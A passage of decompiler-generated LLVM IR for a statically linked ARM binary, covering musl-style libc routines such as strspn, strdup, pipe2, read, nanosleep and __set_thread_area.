  %v1_13434 = inttoptr i32 %v0_13434 to i8*
  %v2_13434 = load i8, i8* %v1_13434, align 1
  %v3_13434 = zext i8 %v2_13434 to i32
  store i32 %v3_13434, i32* %r1.global-to-local, align 4
  %v2_13438 = icmp eq i8 %v2_13434, 0
  br i1 %v2_13438, label %dec_label_pc_134a4, label %dec_label_pc_13440

dec_label_pc_13440:                               ; preds = %dec_label_pc_13434
  %div12 = udiv i8 %v2_13434, 32
  %v3_13440 = zext i8 %div12 to i32
  %v2_13444 = ptrtoint i32* %stack_var_-16 to i32
  %v3_13448 = mul nuw nsw i32 %v3_13440, 4
  %v2_1344c = add i32 %v3_13448, %v2_13444
  %v1_13450 = add i32 %v2_1344c, -32
  %v2_13450 = inttoptr i32 %v1_13450 to i32*
  %v3_13450 = load i32, i32* %v2_13450, align 4
  %tmp16 = urem i8 %v2_13434, 32
  %v1_13454 = zext i8 %tmp16 to i32
  store i32 %v1_13454, i32* %r1.global-to-local, align 4
  %v6_13458 = lshr i32 %v3_13450, %v1_13454
  %v1_1345c = urem i32 %v6_13458, 2
  %v2_1345c = icmp eq i32 %v1_1345c, 0
  br i1 %v2_1345c, label %dec_label_pc_13464, label %dec_label_pc_134a4

dec_label_pc_13464:                               ; preds = %dec_label_pc_13440
  br label %dec_label_pc_1347c

dec_label_pc_1346c:                               ; preds = %dec_label_pc_1347c
  %div13 = udiv i8 %v3_1347c, 32
  %v3_13480 = zext i8 %div13 to i32
  %v3_13488 = mul nuw nsw i32 %v3_13480, 4
  %v2_13490 = add i32 %v3_13488, %v2_13444
  %v1_1346c = add i32 %v2_13490, -32
  %v2_1346c = inttoptr i32 %v1_1346c to i32*
  %v3_1346c = load i32, i32* %v2_1346c, align 4
  %v6_13470 = lshr i32 %v3_1346c, %v1_13494
  %v1_13474 = urem i32 %v6_13470, 2
  %v2_13474 = icmp eq i32 %v1_13474, 0
  br i1 %v2_13474, label %dec_label_pc_1347c, label %dec_label_pc_1349c

dec_label_pc_1347c:                               ; preds = %dec_label_pc_1346c, %dec_label_pc_13464
  %v0_1347c = phi i32 [ %v1_1347c, %dec_label_pc_1346c ], [ %v0_13434, %dec_label_pc_13464 ]
  %v1_1347c = add i32 %v0_1347c, 1
  %v2_1347c = inttoptr i32 %v1_1347c to i8*
  %v3_1347c = load i8, i8* %v2_1347c, align 1
  %v2_1348c = icmp eq i8 %v3_1347c, 0
  %tmp17 = urem i8 %v3_1347c, 32
  %v1_13494 = zext i8 %tmp17 to i32
  store i32 %v1_13494, i32* %r1.global-to-local, align 4
  br i1 %v2_1348c, label %dec_label_pc_1349c, label %dec_label_pc_1346c

dec_label_pc_1349c:                               ; preds = %dec_label_pc_1346c, %dec_label_pc_1347c
  %v2_1349c = sub i32 %v1_1347c, %v0_13434
  br label %dec_label_pc_1339c

dec_label_pc_134a4:                               ; preds = %dec_label_pc_13440, %dec_label_pc_13434
  br label %dec_label_pc_1339c

; uselistorder directives
  uselistorder i32 %v1_13494, { 1, 0 }
  uselistorder i8 %v3_1347c, { 0, 2, 1 }
  uselistorder i32 %v1_1347c, { 0, 2, 1 }
  uselistorder i8 %v3_13410, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 5, 4, 7, 6, 0 }
  uselistorder i32 ()* @__strchrnul, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1349c, { 1, 0 }
}

define i32 @__strdup(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_134ac = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_134b8 = call i32 @strlen(i8* %arg1)
  %v1_134bc = add i32 %v3_134b8, 1
  store i32 %v1_134bc, i32* @r4, align 4
  store i32 %v1_134bc, i32* @r0, align 4
  %v0_134c4 = call i32 @malloc()
  store i32 %v0_134c4, i32* %r0.global-to-local, align 4
  %v2_134c8 = icmp eq i32 %v0_134c4, 0
  br i1 %v2_134c8, label %bb, label %bb9

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread1

bb9:                                              ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %bb, %bb9
  %v1_134d8 = xor i1 %v2_134c8, true
  call void @__pseudo_cond_branch(i1 %v1_134d8, i32 ptrtoint (i32* @global_var_fa24.651 to i32))
  store i32 %v6_134ac, i32* @r5, align 4
  %v1_134e4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_134e4

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32 ()* @malloc, { 7, 3, 0, 11, 10, 9, 8, 6, 5, 4, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @strspn(i8* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_134e8 = load i32, i32* @lr, align 4
  store i32 %v0_134e8, i32* %stack_var_-4, align 4
  %v0_134ec = load i32, i32* @r1, align 4
  %v1_134ec = inttoptr i32 %v0_134ec to i8*
  %v2_134ec = load i8, i8* %v1_134ec, align 1
  %v3_134ec = zext i8 %v2_134ec to i32
  %v2_134f0 = icmp eq i8 %v2_134ec, 0
  %v0_134f4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_134f4, i32* %lr.global-to-local, align 4
  br i1 %v2_134f0, label %bb, label %dec_label_pc_13504

bb:                                               ; preds = %entry
  store i32 %v3_134ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13530

dec_label_pc_13504:                               ; preds = %entry
  %v1_13504 = add i32 %v0_134ec, 1
  %v2_13504 = inttoptr i32 %v1_13504 to i8*
  %v3_13504 = load i8, i8* %v2_13504, align 1
  %v4_13504 = zext i8 %v3_13504 to i32
  store i32 %v4_13504, i32* %r0.global-to-local, align 4
  %v2_13508 = icmp eq i8 %v3_13504, 0
  br i1 %v2_13508, label %dec_label_pc_13510, label %dec_label_pc_1353c

dec_label_pc_13510:                               ; preds = %dec_label_pc_13504
  %v1_13510 = inttoptr i32 %v0_134f4 to i8*
  %v2_13510 = load i8, i8* %v1_13510, align 1
  %v9_13514 = icmp eq i8 %v2_13510, %v2_134ec
  br i1 %v9_13514, label %dec_label_pc_1351c, label %dec_label_pc_13530

dec_label_pc_1351c:                               ; preds = %dec_label_pc_13510
  store i32 %v0_134f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13520

dec_label_pc_13520:                               ; preds = %dec_label_pc_13520, %dec_label_pc_1351c
  %v0_13520 = phi i32 [ %v1_13520, %dec_label_pc_13520 ], [ %v0_134f4, %dec_label_pc_1351c ]
  %v1_13520 = add i32 %v0_13520, 1
  %v2_13520 = inttoptr i32 %v1_13520 to i8*
  %v3_13520 = load i8, i8* %v2_13520, align 1
  store i32 %v1_13520, i32* %r0.global-to-local, align 4
  %v9_13524 = icmp eq i8 %v3_13520, %v2_134ec
  br i1 %v9_13524, label %dec_label_pc_13520, label %dec_label_pc_1352c

dec_label_pc_1352c:                               ; preds = %dec_label_pc_135d8, %dec_label_pc_13520
  %v1_1352c = phi i32 [ %v1_13520, %dec_label_pc_13520 ], [ %v1_135e8, %dec_label_pc_135d8 ]
  %v0_1352c = phi i32 [ %v0_134f4, %dec_label_pc_13520 ], [ %v0_135a0, %dec_label_pc_135d8 ]
  %v2_1352c = sub i32 %v1_1352c, %v0_1352c
  store i32 %v2_1352c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13530

dec_label_pc_13530:                               ; preds = %bb, %dec_label_pc_13510, %dec_label_pc_13610, %dec_label_pc_13608, %dec_label_pc_1352c
  %v1_13538 = phi i32 [ %v4_13504, %dec_label_pc_13510 ], [ %v3_134ec, %bb ], [ 0, %dec_label_pc_13610 ], [ %v2_13608, %dec_label_pc_13608 ], [ %v2_1352c, %dec_label_pc_1352c ]
  %v2_13534 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_13534, i32* @lr, align 4
  ret i32 %v1_13538

dec_label_pc_1353c:                               ; preds = %dec_label_pc_13504
  store i32 %v0_134ec, i32* %ip.global-to-local, align 4
  %v2_1356c = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_13564

dec_label_pc_13564:                               ; preds = %dec_label_pc_13564, %dec_label_pc_1353c
  %v0_13564 = phi i32 [ %v1_13594, %dec_label_pc_13564 ], [ %v0_134ec, %dec_label_pc_1353c ]
  %v1_13564 = inttoptr i32 %v0_13564 to i8*
  %v2_13564 = load i8, i8* %v1_13564, align 1
  %v3_13564 = zext i8 %v2_13564 to i32
  store i32 %v3_13564, i32* %r0.global-to-local, align 4
  %div = udiv i8 %v2_13564, 32
  %v3_13568 = zext i8 %div to i32
  %v3_13570 = mul nuw nsw i32 %v3_13568, 4
  %v2_13574 = add i32 %v3_13570, %v2_1356c
  %v1_13578 = add i32 %v2_13574, -32
  %v2_13578 = inttoptr i32 %v1_13578 to i32*
  %v3_13578 = load i32, i32* %v2_13578, align 4
  %tmp25 = urem i8 %v2_13564, 32
  %v1_1357c = zext i8 %tmp25 to i32
  store i32 %v1_1357c, i32* %r0.global-to-local, align 4
  %v7_13584 = shl i32 1, %v1_1357c
  %v8_13584 = or i32 %v3_13578, %v7_13584
  store i32 %v8_13584, i32* %v2_13578, align 4
  %v0_13594 = load i32, i32* %ip.global-to-local, align 4
  %v1_13594 = add i32 %v0_13594, 1
  %v2_13594 = inttoptr i32 %v1_13594 to i8*
  %v3_13594 = load i8, i8* %v2_13594, align 1
  store i32 %v1_13594, i32* %ip.global-to-local, align 4
  %v2_13598 = icmp eq i8 %v3_13594, 0
  br i1 %v2_13598, label %dec_label_pc_135a0, label %dec_label_pc_13564

dec_label_pc_135a0:                               ; preds = %dec_label_pc_13564
  %v0_135a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_135a0 = inttoptr i32 %v0_135a0 to i8*
  %v2_135a0 = load i8, i8* %v1_135a0, align 1
  %v2_135a4 = icmp eq i8 %v2_135a0, 0
  br i1 %v2_135a4, label %dec_label_pc_13610, label %dec_label_pc_135ac

dec_label_pc_135ac:                               ; preds = %dec_label_pc_135a0
  %div23 = udiv i8 %v2_135a0, 32
  %v3_135ac = zext i8 %div23 to i32
  %v3_135b4 = mul nuw nsw i32 %v3_135ac, 4
  %v2_135b8 = add i32 %v3_135b4, %v2_1356c
  %v1_135bc = add i32 %v2_135b8, -32
  %v2_135bc = inttoptr i32 %v1_135bc to i32*
  %v3_135bc = load i32, i32* %v2_135bc, align 4
  %tmp26 = urem i8 %v2_135a0, 32
  %v1_135c0 = zext i8 %tmp26 to i32
  %v6_135c4 = lshr i32 %v3_135bc, %v1_135c0
  %v1_135c8 = urem i32 %v6_135c4, 2
  %v2_135c8 = icmp eq i32 %v1_135c8, 0
  br i1 %v2_135c8, label %dec_label_pc_13610, label %dec_label_pc_135d0

dec_label_pc_135d0:                               ; preds = %dec_label_pc_135ac
  store i32 %v0_135a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_135e8

dec_label_pc_135d8:                               ; preds = %dec_label_pc_135e8
  %tmp27 = urem i8 %v3_135e8, 32
  %v1_13600 = zext i8 %tmp27 to i32
  %div24 = udiv i8 %v3_135e8, 32
  %v3_135ec = zext i8 %div24 to i32
  %v3_135f4 = mul nuw nsw i32 %v3_135ec, 4
  %v2_135fc = add i32 %v3_135f4, %v2_1356c
  %v1_135d8 = add i32 %v2_135fc, -32
  %v2_135d8 = inttoptr i32 %v1_135d8 to i32*
  %v3_135d8 = load i32, i32* %v2_135d8, align 4
  %v6_135dc = lshr i32 %v3_135d8, %v1_13600
  %v1_135e0 = urem i32 %v6_135dc, 2
  %v2_135e0 = icmp eq i32 %v1_135e0, 0
  br i1 %v2_135e0, label %dec_label_pc_1352c, label %dec_label_pc_135e8

dec_label_pc_135e8:                               ; preds = %dec_label_pc_135d8, %dec_label_pc_135d0
  %v0_135e8 = phi i32 [ %v1_135e8, %dec_label_pc_135d8 ], [ %v0_135a0, %dec_label_pc_135d0 ]
  %v1_135e8 = add i32 %v0_135e8, 1
  %v2_135e8 = inttoptr i32 %v1_135e8 to i8*
  %v3_135e8 = load i8, i8* %v2_135e8, align 1
  store i32 %v1_135e8, i32* %r0.global-to-local, align 4
  %v2_135f8 = icmp eq i8 %v3_135e8, 0
  br i1 %v2_135f8, label %dec_label_pc_13608, label %dec_label_pc_135d8

dec_label_pc_13608:                               ; preds = %dec_label_pc_135e8
  %v2_13608 = sub i32 %v1_135e8, %v0_135a0
  store i32 %v2_13608, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13530

dec_label_pc_13610:                               ; preds = %dec_label_pc_135ac, %dec_label_pc_135a0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13530

; uselistorder directives
  uselistorder i32 %v2_13608, { 1, 0 }
  uselistorder i8 %v3_135e8, { 2, 0, 1 }
  uselistorder i32 %v1_135e8, { 1, 3, 4, 0, 2 }
  uselistorder i32 %v0_135a0, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_13594, { 1, 2, 0 }
  uselistorder i32 %v1_13520, { 0, 2, 3, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 1 }
  uselistorder i8 32, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 17, 18, 19, 20, 16, 21, 22, 23, 24, 27, 26, 28, 25, 31, 30, 29, 32, 33 }
  uselistorder label %dec_label_pc_13530, { 2, 3, 4, 1, 0 }
}

define i32 @__clone(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_13640 = icmp eq i32 %arg3, 0
  br i1 %v2_13640, label %dec_label_pc_13658, label %dec_label_pc_13648

dec_label_pc_13648:                               ; preds = %entry
  ret i32 %arg3

dec_label_pc_13658:                               ; preds = %entry
  %v1_1365c = urem i32 %arg1, 2
  %v2_1365c = icmp eq i32 %v1_1365c, 0
  br i1 %v2_1365c, label %dec_label_pc_13664, label %dec_label_pc_13674

dec_label_pc_13664:                               ; preds = %dec_label_pc_13658
  call void @__pseudo_branch(i32 %arg1)
  br label %dec_label_pc_1366c

dec_label_pc_1366c:                               ; preds = %dec_label_pc_13674, %dec_label_pc_13664
  br label %dec_label_pc_13674

dec_label_pc_13674:                               ; preds = %dec_label_pc_13658, %dec_label_pc_1366c
  call void @__pseudo_branch(i32 %arg1)
  br label %dec_label_pc_1366c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13674, { 1, 0 }
}

define i32 @nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v7_136a8 = call i32 @__syscall_cp(i32 162, i32 %arg1, i32 %arg2, i32 0, i32 0, i32 0, i32 0)
  store i32 %v7_136a8, i32* @r0, align 4
  %v0_136ac = call i32 @__syscall_ret()
  ret i32 %v0_136ac
}

; Function Attrs: noreturn
define void @_exit(i32 %status) local_unnamed_addr #0 {
entry:
  %v1_136bc = call i32 @_Exit(i32 %status)
  ret void

; uselistorder directives
  uselistorder i32 (i32)* @_Exit, { 1, 0 }
}

define i32 @___syscall3.14(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  ret i32 %arg2
}

define i32 @pipe2(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_136e0 = load i32, i32* @r4, align 4
  store i32 %v3_136e0, i32* %stack_var_-16, align 4
  %v9_136e0 = load i32, i32* @r7, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v2_136e4 = icmp eq i32 %arg2, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v2_136e4, label %dec_label_pc_136f0, label %dec_label_pc_136f8

dec_label_pc_136f0:                               ; preds = %entry
  %v0_136f0 = call i32 @pipe()
  br label %dec_label_pc_1370c

dec_label_pc_136f8:                               ; preds = %entry
  %v7_13700 = icmp eq i32* %arg1, inttoptr (i32 -38 to i32*)
  br i1 %v7_13700, label %dec_label_pc_13714, label %dec_label_pc_13708

dec_label_pc_13708:                               ; preds = %dec_label_pc_136f8
  %v0_13708 = call i32 @__syscall_ret()
  br label %dec_label_pc_1370c

dec_label_pc_1370c:                               ; preds = %dec_label_pc_136f0, %dec_label_pc_13708
  %storemerge = phi i32 [ %v0_13708, %dec_label_pc_13708 ], [ %v0_136f0, %dec_label_pc_136f0 ]
  store i32 %storemerge, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13784

dec_label_pc_13714:                               ; preds = %dec_label_pc_136f8
  store i32 %tmp, i32* @r0, align 4
  %v0_13718 = call i32 @pipe()
  store i32 %v0_13718, i32* %r7.global-to-local, align 4
  %v2_1371c = icmp eq i32 %v0_13718, 0
  br i1 %v2_1371c, label %dec_label_pc_13724, label %dec_label_pc_13784

dec_label_pc_13724:                               ; preds = %dec_label_pc_13714
  %v0_13724 = load i32, i32* %r5.global-to-local, align 4
  %v1_13724 = and i32 %v0_13724, 524288
  %v2_13724 = icmp eq i32 %v1_13724, 0
  br i1 %v2_13724, label %dec_label_pc_13754, label %dec_label_pc_1372c

dec_label_pc_1372c:                               ; preds = %dec_label_pc_13724
  %v0_1372c = load i32, i32* @r4, align 4
  %v1_1372c = inttoptr i32 %v0_1372c to i32*
  %v2_1372c = load i32, i32* %v1_1372c, align 4
  %v4_1373c = call i32 @___syscall3.14(i32 221, i32 %v2_1372c, i32 2, i32 1)
  %v0_13744 = load i32, i32* @r4, align 4
  %v1_13744 = add i32 %v0_13744, 4
  %v2_13744 = inttoptr i32 %v1_13744 to i32*
  %v3_13744 = load i32, i32* %v2_13744, align 4
  %v4_13750 = call i32 @___syscall3.14(i32 221, i32 %v3_13744, i32 2, i32 1)
  %v0_13754.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13754

dec_label_pc_13754:                               ; preds = %dec_label_pc_13724, %dec_label_pc_1372c
  %v0_13754 = phi i32 [ %v0_13724, %dec_label_pc_13724 ], [ %v0_13754.pre, %dec_label_pc_1372c ]
  %v1_13754 = and i32 %v0_13754, 2048
  %v2_13754 = icmp eq i32 %v1_13754, 0
  br i1 %v2_13754, label %dec_label_pc_13784, label %dec_label_pc_1375c

dec_label_pc_1375c:                               ; preds = %dec_label_pc_13754
  %v0_1375c = load i32, i32* @r4, align 4
  %v1_1375c = inttoptr i32 %v0_1375c to i32*
  %v2_1375c = load i32, i32* %v1_1375c, align 4
  %v4_1376c = call i32 @___syscall3.14(i32 221, i32 %v2_1375c, i32 4, i32 2048)
  %v0_13770 = load i32, i32* @r4, align 4
  %v1_13770 = add i32 %v0_13770, 4
  %v2_13770 = inttoptr i32 %v1_13770 to i32*
  %v3_13770 = load i32, i32* %v2_13770, align 4
  %v4_13780 = call i32 @___syscall3.14(i32 221, i32 %v3_13770, i32 4, i32 2048)
  br label %dec_label_pc_13784

dec_label_pc_13784:                               ; preds = %dec_label_pc_13714, %dec_label_pc_13754, %dec_label_pc_1370c, %dec_label_pc_1375c
  %v0_13784 = load i32, i32* %r7.global-to-local, align 4
  %v2_13788 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13788, i32* @r4, align 4
  store i32 %v9_136e0, i32* @r7, align 4
  ret i32 %v0_13784

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @___syscall3.14, { 3, 2, 1, 0 }
  uselistorder i32 221, { 2, 3, 1, 0, 5, 4 }
  uselistorder i32 -38, { 0, 10, 11, 12, 13, 18, 7, 15, 6, 14, 9, 8, 17, 16, 1, 2, 3, 4, 5 }
  uselistorder i32 ()* @pipe, { 1, 0 }
  uselistorder label %dec_label_pc_13784, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_13754, { 1, 0 }
  uselistorder label %dec_label_pc_1370c, { 1, 0 }
}

define i32 @read(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r3, align 4
  store i32 %arg2, i32* @r2, align 4
  %v7_137c0 = call i32 @__syscall_cp(i32 3, i32 %arg1, i32 %arg2, i32 %arg3, i32 0, i32 0, i32 0)
  store i32 %v7_137c0, i32* @r0, align 4
  %v0_137c4 = call i32 @__syscall_ret()
  ret i32 %v0_137c4

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__syscall_cp, { 5, 4, 6, 3, 10, 8, 2, 1, 0, 7, 9 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @__set_thread_area(i32 %arg1) local_unnamed_addr {
entry:
  %v2_137d8 = load i32, i32* @global_var_23e84.414, align 4
  %v3_137dc = load i32, i32* @r4, align 4
  %v6_137dc = load i32, i32* @r5, align 4
  %v9_137dc = load i32, i32* @r6, align 4
  %v15_137dc = load i32, i32* @r8, align 4
  %v1_137e0 = and i32 %v2_137d8, 32768
  %v2_137e0 = icmp eq i32 %v1_137e0, 0
  store i32 %arg1, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_110ac.598 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_23488.597 to i32), i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_23484.593 to i32), i32* @r4, align 4
  br i1 %v2_137e0, label %dec_label_pc_13894, label %dec_label_pc_137fc

dec_label_pc_137fc:                               ; preds = %entry
  %v3_13804 = load i32, i32* @global_var_23e98.412, align 4
  store i32 sub (i32 69868, i32 ptrtoint (i32* @global_var_110ac.598 to i32)), i32* @global_var_23488.597, align 4
  store i32 sub (i32 69780, i32 ptrtoint (i32* @global_var_11058.594 to i32)), i32* @global_var_23484.593, align 4
  %v1_138843 = inttoptr i32 %v3_13804 to i32*
  %v2_138844 = load i32, i32* %v1_138843, align 4
  %v2_138886 = icmp eq i32 %v2_138844, 0
  br i1 %v2_138886, label %dec_label_pc_13890, label %dec_label_pc_13828

dec_label_pc_13828:                               ; preds = %dec_label_pc_137fc, %dec_label_pc_13880
  %v0_13830 = phi i32 [ %v1_13880, %dec_label_pc_13880 ], [ %v3_13804, %dec_label_pc_137fc ]
  %v0_13828 = phi i32 [ %v2_13884, %dec_label_pc_13880 ], [ %v2_138844, %dec_label_pc_137fc ]
  %v7_13828 = icmp eq i32 %v0_13828, 15
  br i1 %v7_13828, label %dec_label_pc_13830, label %dec_label_pc_13880

dec_label_pc_13830:                               ; preds = %dec_label_pc_13828
  %v1_13830 = add i32 %v0_13830, 4
  %v2_13830 = inttoptr i32 %v1_13830 to i32*
  %v3_13830 = load i32, i32* %v2_13830, align 4
  %v1_13834 = inttoptr i32 %v3_13830 to i8*
  %v2_13834 = load i8, i8* %v1_13834, align 1
  %v7_13838 = icmp eq i8 %v2_13834, 118
  br i1 %v7_13838, label %dec_label_pc_13840, label %dec_label_pc_13890

dec_label_pc_13840:                               ; preds = %dec_label_pc_13830
  %v1_13840 = add i32 %v3_13830, 1
  %v2_13840 = inttoptr i32 %v1_13840 to i8*
  %v3_13840 = load i8, i8* %v2_13840, align 1
  %v7_13844 = icmp eq i8 %v3_13840, 54
  br i1 %v7_13844, label %dec_label_pc_1384c, label %dec_label_pc_13890

dec_label_pc_1384c:                               ; preds = %dec_label_pc_13840
  %v1_1384c = add i32 %v3_13830, 2
  %v2_1384c = inttoptr i32 %v1_1384c to i8*
  %v3_1384c = load i8, i8* %v2_1384c, align 1
  %v4_1384c = zext i8 %v3_1384c to i32
  %v1_13850 = add nsw i32 %v4_1384c, -48
  %tmp = icmp ult i32 %v1_13850, 10
  br i1 %tmp, label %dec_label_pc_13890, label %dec_label_pc_1385c

dec_label_pc_1385c:                               ; preds = %dec_label_pc_1384c
  store i32 sub (i32 69832, i32 ptrtoint (i32* @global_var_110ac.598 to i32)), i32* @global_var_23488.597, align 4
  store i32 sub (i32 69772, i32 ptrtoint (i32* @global_var_11058.594 to i32)), i32* @global_var_23484.593, align 4
  br label %dec_label_pc_13890

dec_label_pc_13880:                               ; preds = %dec_label_pc_13828
  %v1_13880 = add i32 %v0_13830, 8
  %v1_13884 = inttoptr i32 %v1_13880 to i32*
  %v2_13884 = load i32, i32* %v1_13884, align 4
  %v2_13888 = icmp eq i32 %v2_13884, 0
  br i1 %v2_13888, label %dec_label_pc_13884.dec_label_pc_13890.loopexit_crit_edge, label %dec_label_pc_13828

dec_label_pc_13894:                               ; preds = %entry
  %v3_13898 = load i32, i32* inttoptr (i32 -61444 to i32*), align 4
  store i32 sub (i32 -61472, i32 ptrtoint (i32* @global_var_11120.601 to i32)), i32* @global_var_2348c.600, align 4
  store i32 sub (i32 -61536, i32 ptrtoint (i32* @global_var_11058.594 to i32)), i32* @global_var_23484.593, align 4
  store i32 sub (i32 -61504, i32 ptrtoint (i32* @global_var_110ac.598 to i32)), i32* @global_var_23488.597, align 4
  %v7_138cc = icmp sgt i32 %v3_13898, 1
  br i1 %v7_138cc, label %bb19, label %bb

bb:                                               ; preds = %dec_label_pc_13894
  call void @llvm.trap()
  unreachable

bb19:                                             ; preds = %dec_label_pc_13894
  %v7_138d0 = icmp eq i32 %v3_13898, 2
  br i1 %v7_138d0, label %bb20, label %dec_label_pc_13890

bb20:                                             ; preds = %bb19
  store i32 sub (i32 69732, i32 ptrtoint (i32* @global_var_11058.594 to i32)), i32* @global_var_23484.593, align 4
  br label %dec_label_pc_13890

dec_label_pc_13884.dec_label_pc_13890.loopexit_crit_edge: ; preds = %dec_label_pc_13880
  br label %dec_label_pc_13890

dec_label_pc_13890:                               ; preds = %bb19, %dec_label_pc_137fc, %dec_label_pc_13884.dec_label_pc_13890.loopexit_crit_edge, %dec_label_pc_13840, %dec_label_pc_13830, %dec_label_pc_1384c, %dec_label_pc_1385c, %bb20
  store i32 %v3_137dc, i32* @r4, align 4
  store i32 %v6_137dc, i32* @r5, align 4
  store i32 %v9_137dc, i32* @r6, align 4
  store i32 %v15_137dc, i32* @r8, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v2_13884, { 1, 0 }
  uselistorder i32 %v1_13880, { 1, 0 }
  uselistorder i32 %v0_13830, { 1, 0 }
  uselistorder void ()* @llvm.trap, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* @global_var_23484.593, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* @global_var_23488.597, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_13890, { 2, 7, 0, 6, 5, 3, 4, 1 }
  uselistorder label %dec_label_pc_13828, { 1, 0 }
}

define i32 @mbsrtowcs() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %v15_13938 = load i32, i32* @lr, align 4
  %v0_1393c = load i32, i32* @r3, align 4
  store i32 %v0_1393c, i32* @ip, align 4
  %v2_1393c = icmp eq i32 %v0_1393c, 0
  %v0_13944 = load i32, i32* @r1, align 4
  store i32 %v0_13944, i32* %r7.global-to-local, align 4
  %v0_13948 = load i32, i32* @r0, align 4
  store i32 %v0_13948, i32* %r5.global-to-local, align 4
  %v0_1394c = load i32, i32* @r2, align 4
  store i32 %v0_1394c, i32* %r6.global-to-local, align 4
  %v1_13950 = inttoptr i32 %v0_13944 to i32*
  %v2_13950 = load i32, i32* %v1_13950, align 4
  store i32 %v2_13950, i32* %r4.global-to-local, align 4
  br i1 %v2_1393c, label %dec_label_pc_13980, label %dec_label_pc_13958

dec_label_pc_13958:                               ; preds = %entry
  %v1_13958 = inttoptr i32 %v0_1393c to i32*
  %v2_13958 = load i32, i32* %v1_13958, align 4
  store i32 %v2_13958, i32* %r1.global-to-local, align 4
  %v2_1395c = icmp eq i32 %v2_13958, 0
  br i1 %v2_1395c, label %dec_label_pc_13980, label %dec_label_pc_13964

dec_label_pc_13964:                               ; preds = %dec_label_pc_13958
  %v2_13964 = icmp eq i32 %v0_13948, 0
  br i1 %v2_13964, label %bb, label %.thread.dec_label_pc_13b94_crit_edge

bb:                                               ; preds = %dec_label_pc_13964
  store i32 %v0_1394c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13a74

.thread.dec_label_pc_13b94_crit_edge:             ; preds = %dec_label_pc_13964
  store i32 %v0_1394c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %v1_13958, align 4
  %v0_13b94.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13ba0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13b94

dec_label_pc_13980:                               ; preds = %dec_label_pc_13958, %entry
  %v0_13980 = call i32 @__aeabi_read_tp()
  store i32 %v0_13980, i32* %r0.global-to-local, align 4
  %v1_13984 = add i32 %v0_13980, -48
  %v2_13984 = inttoptr i32 %v1_13984 to i32*
  %v3_13984 = load i32, i32* %v2_13984, align 4
